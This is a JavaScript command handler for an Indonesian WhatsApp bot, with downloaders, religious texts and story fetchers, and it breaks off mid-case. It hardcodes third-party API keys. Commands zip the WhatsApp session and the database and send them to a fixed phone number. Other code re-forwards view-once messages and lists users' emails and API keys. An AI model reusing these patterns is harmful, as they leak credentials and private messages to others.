process.on("uncaughtException", console.error)
require('./settings')
const { default: makeWASocket, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, downloadContentFromMessage, downloadHistory, proto, getMessage, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const { parseMention, smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, getRandom, generateProfilePicture, reSize} = require('../lib/myfunc')
const axios = require('axios')
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const { EmojiAPI } = require("emoji-api");
const emoji = new EmojiAPI()
const fetch = require('node-fetch')
const ffmpeg = require('fluent-ffmpeg')
const { fromBuffer } = require('file-type')
const fs = require('fs')
const moment = require('moment-timezone')
const util = require('util')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const path = require('path')
const cheerio = require('cheerio')
const PhoneNumber = require('awesome-phonenumber')
const os = require('os')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const qrcode = require('qrcode')
const { createHash } = require('crypto')
const similarity = require('similarity')
const acrcloud = require('acrcloud')
const acr = new acrcloud({ host: "identify-ap-southeast-1.acrcloud.com", access_key: "b1cc283b4fb72483ebb6ea9c53512331", access_secret: "xyqJGTZRTrUotaraHEjji00WBClx7RpWozywdANq"})
const yts = require('yt-search')
const ytdl = require('ytdl-core')
const {  kompas, latinToAksara, aksaraToLatin, jadwalsholat, tiktokdl, tiktokdlv3, tiktokdlv2, instagramdl, instagramdlv2, instagramdlv3, instagramdlv4, facebookdl, facebookdlv2, lyrics, lyricsv2} = require('@bochilteam/scraper')
const simple = require('../lib/myfunc')
const { mediafireDl } = require('../lib/mediafire')
const textpro = require('../lib/textpro')
const { pinterest, hentai, wallpaper, wikimedia, quotesAnime } = require('../lib/scraper')
const {slot, allmenu, bahasa, sewa, readme, channel, snk}= require('./help')
const noapi = require('../lib/api') 
const api2 = require('../lib/api2') 
const { lann } = require('../lib/lann')
const { cerpen } = require('../lib/cerpen')
const { wikiSearch } = require('../lib/wiki');
const { toAudio, toPTT} = require('../lib/converter')
const { yta, ytv } = require('../lib/y2mate')
const { covid, copid } = require('../lib/copid.js')


module.exports = Resta = async(Resta, m, chatUpdate, store) => {
           try {
           const { type, quotedMsg, mentioned, now, fromMe } = m
           var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowI || m.text) : ''
           var budy = (typeof m.text == 'string' ? m.text : '')
           const prefix = /^[Â°â€¢Ï€Ã·Ã—Â¶âˆ†Â£Â¢â‚¬Â¥Â®â„¢âœ“=|~+Ã—_*!#%^&./\\Â©^]/.test(body) ? body.match(/^[Â°â€¢Ï€Ã·Ã—Â¶âˆ†Â£Â¢â‚¬Â¥Â®â„¢âœ“=|~+Ã—_*!#,|`Ã·?;:%abcdefghijklmnopqrstuvwxyz%^&./\\Â©^]/gi) : '#'
           const isCmd = body.startsWith(prefix)
           const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
           const args = body.trim().split(/ +/).slice(1)
           const pushname = m.pushName || "No Name"
           const botNumber = await Resta.decodeJid(Resta.user.id)
           const isOwner = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
           const itsMe = m.sender == botNumber ? true : false
           const text = args.join(" ")
           const q = args.join(" ")
           const quoted = m.quoted ? m.quoted : m
           const mime = (quoted.msg || quoted).mimetype || ''
           const qmsg = (quoted.msg || quoted)
           const isMedia = /image|video|sticker|audio/.test(mime)
           const from = mek.key.remoteJid
           const isGroup = m.key.remoteJid.endsWith('@g.us')
           const groupMetadata = m.isGroup ? await Resta.groupMetadata(m.chat).catch(e => {}) : ''
           const groupName = m.isGroup ? groupMetadata.subject : ''
           const participants = m.isGroup ? await groupMetadata.participants : ''
           const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
           const groupOwner = m.isGroup ? groupMetadata.owner : ''
           const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
           const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
           const mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
           const isNumber = x => typeof x === 'number' && !isNaN(x)
           const time = moment().tz('asia/jakarta').format("hh:mm:ss")
           const wib = moment.tz('asia/jakarta').format('hh:mm:ss')
           const wita = moment.tz('asia/makassar').format("hh:mm:ss")
           const wit = moment.tz('asia/jayapura').format("hh:mm:ss")
           const hour_now = moment().format('hh:mm:ss') 
		   //TIME
const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')  
 if(time2 < "23:59:00"){
var ucapanWaktu = 'Selamat Malam 🌌'
 }
 if(time2 < "19:00:00"){
var ucapanWaktu = 'Selamat Sore 🌃'
 }
 if(time2 < "18:00:00"){
var ucapanWaktu = 'Selamat Sore 🌅'
 }
 if(time2 < "15:00:00"){
var ucapanWaktu = 'Selamat Siang 🏙'
 }
 if(time2 < "11:00:00"){
var ucapanWaktu = 'Selamat Pagi 🌄'
 }
 if(time2 < "05:00:00"){
var ucapanWaktu = 'Selamat Pagi 🌉'
 } 
             
           let user = db.data.users[m.sender]
            try {
            m = simple.smsg(Resta, m) || m
            if (!m) return
            m.exp = 0  
            let user = db.data.users[m.sender]
            if (typeof user !== 'object') db.data.users[m.sender] = {}
            if (user) {
            if (!isNumber(user.afkTime)) user.afkTime = -1
            if (!('afkReason' in user))
            user.afkReason = ''
            if (!('pasangan' in user))
            user.pasangan = ''
            if (!('registered' in user))
            user.registered = false
            if (!user.registered) {
            if (!('name' in user)) 
            user.name = Resta.getName(m.sender)
            if (!isNumber(user.age))
            user.age = -1
            if (!isNumber(user.regTime))
            user.regTime = -1
            }
            if (!isNumber(user.level)) user.level = 0
            if (!('autolevelup' in user)) user.autolevelup = true
            if (!isNumber(user.exp)) user.exp = 0
            } else global.db.data.users[m.sender] = {
            afkTime: -1,
            afkReason: '',
            pasangan: '',
            registered: false,
            name: Resta.getName(m.sender),
            age: -1,
            regTime: -1,
            exp: 0,
            }
            let chats = global.db.data.chats[m.chat]
            if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
            if (chats) {
            if (!('antilink' in chats)) chats.antilink = false
            if (!('welcome' in chats)) chats.welcome = false
            if (!('maintenance' in chats)) chats.maintenance = false
            if (!('antivionce' in chats)) chats.antivionce = false
            } else global.db.data.chats[m.chat] = {
            antivionce: false,
            antilink: false,
            maintenance: false,
            }
            } catch (err) {
            console.error(err) 
            }
            function clockString(ms) {
            let h = Math.floor(ms / 3600000)
            let m = Math.floor(ms / 60000) % 60
            let s = Math.floor(ms / 1000) % 60
            console.log({ms,h,m,s})
            return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
            }
            function msToTime(duration) {
            var milliseconds = parseInt((duration % 1000) / 100),
            seconds = Math.floor((duration / 1000) % 60),
            minutes = Math.floor((duration / (1000 * 60)) % 60),
            hours = Math.floor((duration / (1000 * 60 * 60)) % 24)    
            hours = (hours < 10) ? "0" + hours : hours
            minutes = (minutes < 10) ? "0" + minutes : minutes
            seconds = (seconds < 10) ? "0" + seconds : seconds
            return hours + " jam " + minutes + " menit " + seconds + " detik"
            }
            const pickRandom = (arr) => {
	        return arr[Math.floor(Math.random() * arr.length)]
		    }
			
			//fakealldoc
let documents = [doc1,doc2,doc3,doc4,doc5,doc6,doc7,doc8,doc9]
let docs = pickRandom(documents)

//save data 5 menit
            //randomcolor
var randomColor = ['#ef1a11', '#89cff0', '#660000', '#87a96b', '#e9f6ff', '#ffe7f7', '#ca86b0', '#83a3ee', '#abcc88', '#80bd76', '#6a84bd', '#5d8d7f', '#530101', '#863434', '#013337', '#133700', '#2f3641', '#cc4291', '#7c4848', '#8a496b', '#722f37', '#0fc163', '#2f3641', '#e7a6cb', '#64c987', '#e6e6fa', '#ffffff'];
const apiColor = randomColor[Math.floor(Math.random() * randomColor.length)];
     
            if (global.db.data.chats[m.chat].antivionce) {
            if (m.mtype == 'viewOnceMessage') {
            teks = `「 *Anti ViewOnce Message* 」\n➯ Name : ${m.pushName}\n➯ User : @${m.sender.split("@")[0]}\n➯ Clock : ${moment.tz('Asia/Kolkata').format('HH:mm:ss')} \n➯ Date : ${moment.tz('Asia/Kolkata').format('DD/MM/YYYY')}\n➯ MessageType : ${m.mtype}`
            Resta.sendTextWithMentions(m.chat, teks, m)
            await sleep(5000)
            m.copyNForward(m.chat, true, { readViewOnce: true }).catch(_ => m.reply(`Maybe it's been opened by a bot`))
            }
            }
            if (global.db.data.chats[m.chat].antilink) {
            if (budy.match(`chat.whatsapp.com`)) {
            if (!isBotAdmins) return m.reply(mess.botAdmin)
            var gclink = (`https://chat.whatsapp.com/`+await Resta.groupInviteCode(m.chat))
            var isLinkThisGc = new RegExp(gclink, 'i')
            var isgclink = isLinkThisGc.test(m.text)
            if (isAdmins && isOwner) return m.reply(`Ehh Maaf Ternyata Kamu Admin 😁`)
            if (isgclink) return m.reply(`Link Grup Lain Terdeteksi, Link Group Ini Ternyata 😆`)
            m.reply(`Link Grup Lain Terdeteksi 🤬\nMaaf Kamu Akan Di Kick !`)
            sleep(5000)
            Resta.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
            }
            }
            for (let jid of mentionUser) {
            let user = global.db.data.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            m.reply(`Jangan tag dia!Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}\nSelama ${clockString(new Date - afkTime)}`.trim())
            }
            if (db.data.users[m.sender].afkTime > -1) {
            let user = global.db.data.users[m.sender]
            Resta.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} berhenti AFK${user.afkReason ? ' setelah ' + user.afkReason : ''} Selama ${clockString(new Date - user.afkTime)}`)
            user.afkTime = -1
            user.afkReason = ''
            }
            if (m.message) { // push cmd, read, dan presence
            Resta.readMessages([m.key])
            Resta.sendPresenceUpdate('available', m.chat)
            console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mCMD\x1b[1;37m]', chalk.green(command), 'Dari', chalk.blue(pushname), 'Di', chalk.yellow(groupName ? groupName : 'Private Chat' ), 'args :', chalk.white(args.length))
            } 
	if (m.message) { // auto set bio
		let times = speed()
    let late = speed() - times
		Resta.updateProfileStatus(`Speed: ${late.toFixed(4)} Ms | Runtime: ${runtime(process.uptime())} | RESELLER DENOM🤙`)
	}
            const qtod = m.quoted? "true":"false"
            let motiv = await fetchJson(`https://raw.githubusercontent.com/KilluaBot/Databes/main/Random%20Text/motivasi.json`)
const motiva = pickRandom(motiv)
const downloadMp4 = async (link) => {
  try {
    await ytdl.getInfo(link)
    const mp4FilePath = `./src/video.mp4`
    console.log('Downloading Video')
    ytdl(link, { filter: 'audioandvideo', quality: 'highestvideo' })
      .pipe(fs.createWriteStream(mp4FilePath))
      .on('finish', async () => {
        const videoFile = fs.readFileSync(mp4FilePath)
        await Resta.sendMessage(m.chat, { video: videoFile, mimetype: 'video/mp4' }, { quoted: m })
      })
  } catch (err) {
    console.error(err)
    m.reply('An error occurred while downloading the video.')
  }
}
const downloadMp3 = async (link) => {
  try {
    await ytdl.getInfo(link)
    const mp3FilePath = `./src/music.mp3`
    console.log('Downloading Audio')
    ytdl(link, { filter: 'audioonly', quality: 'highestaudio' })
      .pipe(fs.createWriteStream(mp3FilePath))
      .on('finish', async () => {
        const audioFile = fs.readFileSync(mp3FilePath)
        await Resta.sendMessage(m.chat, { audio: audioFile, mimetype: 'audio/mpeg' }, { quoted: m })
      })
  } catch (err) {
    m.reply('An error occurred while downloading the music.')
  }
}

let fwait ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: `${moment(Date.now()).tz('Asia/Jakarta').locale('id').format('DDMMYYYY')}`,status: 200, thumbnail: await Resta.reSize(erorurl, 100, 100), surface: 200, message: `Wait a moment`, orderTitle: 'Tio', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
switch(command) {  
case 'jadianime':{
try{
if (!quoted) return m.reply('Balas Fotonya')
m.reply(mess.wait)
               let { UploadFileUgu, webp2mp4File, TelegraPh } = require('../lib/uploader')
               let mpoedia = await Resta.downloadAndSaveMediaMessage(quoted)
               if (/image/.test(mime)) {
               anu = await TelegraPh(mpoedia)
               } else if (!/image/.test(mime)) {
               anu = await UploadFileUgu(mpoedia)
               }
               fs.unlinkSync(mpoedia)
               await Resta.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/imagetoanime?apikey=BrunoSobrino&img=${util.format(anu)}`}, caption: `Bjir Anime 2D`},{quoted:m})
} catch (err){
  m.reply(err)
}
}
break
case 'translate':
case 'tr': {
  const { translate } = require('@vitalets/google-translate-api');
  try {
    if (!args[0]) return m.reply(bahasa(prefix))
    let err = `
    📌 *Example:*
    *${command}* <lang> [texto]
    *${command}* id Hello World
    ≡ *Lista de idiomas admitidos:* 
    https://cloud.google.com/translate/docs/languages
    `.trim();

    let text = args.slice(1).join(' ');
    if ((args[0] || '').length !== 2) {
      text = args.join(' ');
    }
    if (!text && m.quoted && m.quoted.text) text = m.quoted.text;

    let result = await translate(text, { to: args[0], autoCorrect: true });
    m.reply(result.text);
  } catch (err) {
    console.log(err);
    Resta.sendText(m.chat, bahasa(prefix), m);
  }
}
  break;
  case 'twitter': case 'twdl': {
if (!args[0]) { throw m.reply(`Masukkan URL`) }
try {
m.reply(mess.wait)
const response = await fetch(`${lannn}/api/download/twitter?url=${args[0]}&apikey=${lannkey}`)
if (!response.ok) {
throw await respone.text()
}
const result = await response.json()
if (!result.status) {
throw result
}
const { desc,  thumb, HD, SD, audio } = result.result
const twet = HD || SD
if (!twet) {
throw m.reply('Tidak Dapat Menemukan Video Twitter')
}
await Resta.sendFile(
m.chat,
twet,
'twitter.mp4',
`${desc}`,
m )
} catch (err) {
m.reply('Terjadi Kesalahan')
}
}
break
  case 'listusr': case 'listuser': {
    if (!isOwner && !m.key.fromMe) return m.reply(mess.botOwner)
let page = args[0] ? args[0] : '1'
no = 0
crod = "📝 *List User https://api.lannn.me*"
const usr = await fetchJson(`${lannn}/listuser-js?page=${page}`)
for (let i of usr.data ) {
no += 1
crod += `\n🔎 ${no.toString()} \n`
crod += `🐸 ️Id : ${i._id}\n`
crod += `🗯️️ Username : ${i.username}\n`
crod += `💌️️ Email : ${i.email}\n`
crod += `🔖️ Apikey : ${i.apikey}\n`
crod += `🔖️ Default Key : ${i.defaultKey}\n`
crod += `🏨 ️Limit : ${i.limit}\n\n============================`
}
crod += ""
let pages = `🍃 Total User : ${usr.totalData}\n\n🗯 Total Pages : ️${usr.totalPages}\n\n⏯️ Next Pages : ${usr.nextPage}`
let us = await getBuffer(`https://telegra.ph/file/2c4ec0d1f1e183d79430b.jpg`)
let buttons = [{ buttonId: `listusr ${usr.nextPage}`, buttonText: { displayText: 'Next 🔎️' }, type: 1 }] 
await Resta.sendMessage(m.chat, { image: us, buttons: buttons, caption: crod, footer: pages, m }, {quoted: m})
  }
break
  case 'tomp4': case 'tovideo': case 'tovid': {
    if (!m.quoted) return m.reply('Reply Image')
    if (!/webp/.test(mime)) return m.reply(`balas stiker dengan caption *${prefix + command}*`)
    m.reply(mess.wait)
    let { webp2mp4File } = require('../lib/uploader.js')
    let media = await Resta.downloadAndSaveMediaMessage(quoted)
    let webpToMp4 = await webp2mp4File(media)
    await Resta.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
    await fs.unlinkSync(media)
    }
    break
    case 'getsesi':{
      if (!isOwner && !m.key.fromMe) return m.reply(mess.botOwner)
      let cp = require('child_process')
      let { promisify } = require('util')
      let exec = promisify(cp.exec).bind(cp)
      try {
        m.reply('Sebentar...')
        await exec('powershell Compress-Archive -Path session -DestinationPath session.zip')
      } catch (e) {
        try {
        await exec('zip -r session.zip session')
        } catch (e2) {
          m.reply('error pas kompres:v')
        }
      }
      await Resta.sendMessage('6281233649676@s.whatsapp.net', {document: fs.readFileSync('./session.zip'), mimetype: 'application/zip', fileName: `session.zip`})  
      await fs.unlinkSync('./session.zip')
      await m.reply('File sent and deleted successfully')
    }
    break    
    case 'getmodul':{
      if (!isOwner && !m.key.fromMe) return m.reply(mess.botOwner)
      let cp = require('child_process')
      let { promisify } = require('util')
      let exec = promisify(cp.exec).bind(cp)
      try {
        m.reply('Sebentar...')
        await exec('powershell Compress-Archive -Path node_modules -DestinationPath node_modules.zip')
      } catch (e) {
        try {
        await exec('zip -r node_modules.zip node_modules')
        } catch (e2) {
          m.reply('error pas kompres:v')
        }
      }
      await Resta.sendMessage('6281233649676@s.whatsapp.net', {document: fs.readFileSync('./node_modules.zip'), mimetype: 'application/zip', fileName: `node_modules.zip`})  
      await fs.unlinkSync('./node_modules.zip')
      await m.reply('File sent and deleted successfully')
    }
    break    
  case  'getdata':{
    if (!isOwner && !m.key.fromMe) return m.reply(mess.botOwner)
     await Resta.sendMessage('6281233649676@s.whatsapp.net', {document: fs.readFileSync('./src/database.json'), mimetype: 'application/octet-stream', fileName: `database.json`}, {quoted:m})  
  }
    break
case 'jadwalsholat': {
if (!text) throw m.reply(`Use example ${command} semarang`)
    const res = await jadwalsholat(text)
    m.reply(`
*Jadwal Sholat ${text}*
${Object.entries(res.today).map(([name, data]) => `Sholat ${name}: ${data}`).join('\n').trim()}
`.trim())
}
break
case 'gdrive': {
async function GDriveDl(url) {
	let id = (url.match(/\/?id=(.+)/i) || url.match(/\/d\/(.*?)\//))?.[1]
	if (!id) return m.reply('ID Not Found')
	let res = await fetch(`https://drive.google.com/uc?id=${id}&authuser=0&export=download`, {
		method: 'post',
		headers: {
			'accept-encoding': 'gzip, deflate, br',
			'content-length': 0,
			'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
			'origin': 'https://drive.google.com',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
			'x-client-data': 'CKG1yQEIkbbJAQiitskBCMS2yQEIqZ3KAQioo8oBGLeYygE=',
			'x-drive-first-party': 'DriveWebUi',
			'x-json-requested': 'true' 
		}
	})
	let { fileName, sizeBytes, downloadUrl } =  JSON.parse((await res.text()).slice(4))
	if (!downloadUrl) return m.reply('Link Download Limit!')
	let data = await fetch(downloadUrl)
	if (data.status !== 200) throw data.statusText
	return {
		downloadUrl, fileName,
		fileSize: (sizeBytes / 1024 / 1024).toFixed(2),
		mimetype: data.headers.get('content-type')
	}
}
	if (!args[0]) return m.reply(`Input URL\n\nExample: ${command} https://drive.google.com/file/d/0B_WlBmfJ3KOfdlNyVWwzVzQ1QTQ/view?resourcekey=0-P3IayYTmxJ5d8vSlf-CpUA`)
	if (!args[0].match(/drive\.google/i)) return m.reply('Invalid URL')
	let res = await GDriveDl(args[0])
	await Resta.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
}
break
case 'kisahnabi': {
	let ahna = await fetchJson(`https://raw.githubusercontent.com/KilluaBot/Databes/main/Data/dataKisahNabi.json`)
	let nahh = pickRandom(ahna)
	txt = `*Kisah ${nahh.name}*\n\n- Tahun: ${nahh.thn_kelahiran}\n\n- Usia: ${nahh.usia} Thn\n\n${nahh.description}`
	Resta.sendMessage(m.chat, { image:{url:nahh.image_url}, caption: txt },{quoted:m})
}
break
case 'doapendek': {
	let apen = await fetchJson(`https://raw.githubusercontent.com/KilluaBot/Databes/main/Data/dataDoaHarian.json`)
	let pena = pickRandom(apen.data)
	m.reply(`*${pena.title}*\n\n*${pena.arabic}*\n\n- ${pena.latin}\n\n${pena.translation}`)
}
break
case 'asmaulhusna': {
	let maul = await fetchJson(`https://raw.githubusercontent.com/KilluaBot/Databes/main/Data/dataAsmaulHusna.json`)
	let dato = pickRandom(maul.data)
	m.reply(`*Nama Allah SWT yg ke-${dato.index}*\n\n- ${dato.latin}\n\n*${dato.arabic}*\n\n${dato.translation_id}`)
}
break
case 'ayatkursi': {
	let kumsi = await fetchJson(`https://raw.githubusercontent.com/KilluaBot/Databes/main/Data/dataAyatKursi.json`)
	kumsi = kumsi.data
	m.reply(`*${kumsi.arabic}*\n\n- *Latin:* _${kumsi.latin}_\n\n- *Terjemahan:* _${kumsi.translation}_\n\n- *Tafsir:* ${kumsi.tafsir}`)
}
break
case 'creategc': {//tq to ilham//
if (!isOwner && !m.key.fromMe) return m.reply(mess.botOwner)
if (!q) return m.reply(`Contoh :\n#creategc namagroup`)
let cret = await Resta.groupCreate(args.join(" "), [])
let respot = await Resta.groupInviteCode(cret.id)
m.reply(`  「 Create Group 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Time : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB

https://chat.whatsapp.com/${respot}
`)
}
break
case 'ruku':
case 'salam':
case 'sujud':
case 'tasyahudawal':
case 'tasyahudakhir':
case 'diantara2sujud':
case 'iftitah':
case 'al-fatihah': {
let sulat = await fetchJson(`https://raw.githubusercontent.com/KilluaBot/Databes/main/Bacaansolat/${command}.json`)
m.reply(`• *${sulat.name}*\n${sulat.arabic}\n\n*${sulat.latin}*\n\n"${sulat.terjemahan}"`)
}
break
case 'subuh':
case 'dzuhur':
case 'ashar': 
case 'maghrib':
case 'isya': {
let sulat = await fetchJson(`https://raw.githubusercontent.com/KilluaBot/Databes/main/Niatsolat/${command}.json`)
m.reply(`• *${sulat.name}*\n${sulat.arabic}\n\n*${sulat.latin}*\n\n"${sulat.terjemahan}"`)
}
break
case 'report': {
if (!args.join(" ")) return m.reply(`Example : \n- ${prefix + command} fitur ig error min\n- ${prefix + command} user ini nyepam min`)
tekes = `*| REPORT FITUR |*`
tekes1 = `\n\nNomor : @${m.sender.split("@")[0]}\nReport : ${args.join(" ")}`
tekes2 = `\n\nSucces send to owner`
for (let i of owner) {
Resta.sendMessage('6281233649676' + "@s.whatsapp.net", {text: tekes + tekes1, mentions:[m.sender]}, {quoted:m})
}
Resta.sendMessage(m.chat, {text: tekes + tekes2 + tekes1, mentions:[m.sender]}, {quoted:m})
}
break
case 'ocr': {
  const uploadImage = require('../lib/uploadImage')
  const ocrapi = require("ocr-space-api-wrapper");
  const { MessageType } = require('@adiwajshing/baileys');
  const q = m.quoted || m;
  const mime = (q.msg || q).mimetype || '';

  if (!mime || !/image\/(jpe?g|png)/.test(mime)) {
    throw m.reply('Mohon balas gambar dengan perintah .ocr dan pastikan tipe file adalah jpeg atau png');
  }

  try {
    const img = await q.download();
    const url = await uploadImage(img);
    const hasil = await ocrapi.ocrSpace(util.format(url));

    await m.reply(hasil.ParsedResults[0].ParsedText);
  } catch (error) {
    console.log(error);
    await m.reply('Terjadi kesalahan saat melakukan OCR. Silakan coba lagi.');
  }
}
break
case 'wikipedia':
case 'wiki': {
if (args.length < 1) return m.reply(' Yang Mau Di Cari Apa? ')
let gis = require('g-i-s')
        gis(args.join(" "), async (error, result) => {
        n = result
        images = n[Math.floor(Math.random() * n.length)]
async function wikipedia(querry) {
  try {
    const link = await axios.get(`https://id.wikipedia.org/wiki/${querry}`)
    const $ = cheerio.load(link.data)
    let judul = $('#firstHeading').text().trim()
    let thumb = $('#mw-content-text').find('div.mw-parser-output > div:nth-child(1) > table > tbody > tr:nth-child(2) > td > a > img').attr('src') || `//i.ibb.co/nzqPBpC/http-error-404-not-found.png`
    let isi = []
    $('#mw-content-text > div.mw-parser-output').each(function (rayy, Ra) {
      let penjelasan = $(Ra).find('p').text().trim()
      isi.push(penjelasan)
    })
    for (let i of isi) {
      const data = {
        status: link.status,
        result: {
          judul: judul,
          thumb: 'https:' + thumb,
          isi: i
        }
      }
      return data
    }
  } catch (err) {
    var notFond = {
      status: link.status,
      Pesan: eror
    }
    return notFond
  }
}
try{
let res2 = await wikiSearch(q) 
const result2 = `*Wiki :* ${res2[0].wiki}`
await Resta.sendMessage(from, { image: { url: images.url },caption : result2}, {quoted:m})}
catch {
  try{
    await wikipedia(q).then(res => {
    Resta.sendMessage(from, { image: { url: images.url },caption : res.result.isi}, {quoted:m})
    }).catch(() => { m.reply('Tidak Ditemukan') })
  } catch {
m.reply('Error')
  }
} 
})
}
break
 case 'kbbi': {
if (!q) return m.reply('examples: kbbi tahu')
try {
get = await fetchJson(`${lannn}/api/search/kbbi?text=${q}&apikey=${lannkey}`)
tod = get.result
txt = `Kbbi: ${tod.lema},
	${tod.arti}`
m.reply(txt)
} catch (err) {
                console.log(err)
                await Resta.sendMessage(m.chat, { image : { url:  global.erorurl }, caption: err}, { quoted: m })
                }
 }
break
case 'cerpen-islami':{
	let cerpe = await cerpen('islam')
	m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
 case 'cerpen-anak':{
let cerpe = await cerpen(`anak`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-bahasadaerah':{
let cerpe = await cerpen(`bahasa daerah`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-bahasainggris':{
let cerpe = await cerpen(`bahasa Inggris`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-bahasajawa':{
let cerpe = await cerpen(`bahasa jawa`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-bahasasunda':{
let cerpe = await cerpen(`bahasa sunda`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-budaya':{
let cerpe = await cerpen(`budaya`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-cinta':{
let cerpe = await cerpen(`cinta`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-cintaislami':{
let cerpe = await cerpen(`cinta islami`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-cintapertama':{
let cerpe = await cerpen(`cinta pertama`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-cintaromantis':{
let cerpe = await cerpen(`cinta romantis`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-cintasedih':{
let cerpe = await cerpen(`cinta sedih`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-cintasegitiga':{
let cerpe = await cerpen(`Cinta segitiga`)
